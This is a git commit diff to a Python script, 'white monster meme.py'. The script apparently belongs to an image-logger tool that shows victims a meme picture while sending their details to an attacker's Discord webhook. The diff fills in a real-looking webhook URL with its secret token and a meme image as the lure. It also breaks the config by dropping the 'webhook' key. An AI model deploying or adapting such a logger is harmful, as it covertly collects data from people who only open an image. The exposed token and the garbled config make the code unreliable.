e4f41d7809b58e8786d73c6431414e6ad186a3bc
ZKIZ-scripts <beryaxel14@gmail.com>
2026-02-23 02:24:30 +0100

    u

--- api/white monster meme.py
+++ api/white monster meme.py
@@ -13,8 +13,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "https://discord.com/api/webhooks/1475301367995174942/mS32J6knnL3vyxAG1VSt7-qVU4DzezZymaGBnYyz5SF1CCCPCDf3JF-mXZjcQWQB4hEs",
+    "image": "https://i.imgflip.com/7f9vxf.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
